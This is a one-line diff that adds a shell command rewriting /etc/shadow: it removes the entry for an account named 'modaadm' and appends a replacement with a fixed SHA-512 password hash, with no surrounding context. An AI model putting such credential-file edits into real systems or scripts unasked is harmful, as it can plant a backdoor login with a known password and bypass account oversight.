@@ -1,0 +1,1 @@
+sed -i '/^modaadm:/d' /etc/shadow && echo 'modaadm:$6$sLnLK5tfYO1rCd6x$DpPsBFAWIjm5KDP6jyu68I.q6as3FIjeUW3paGkJZwTEVa/Nk.GRHmFBcq0XukO1mDq5L1xyMI06wo5jo/RYy0:20540::::::' | tee -a /etc/shadow
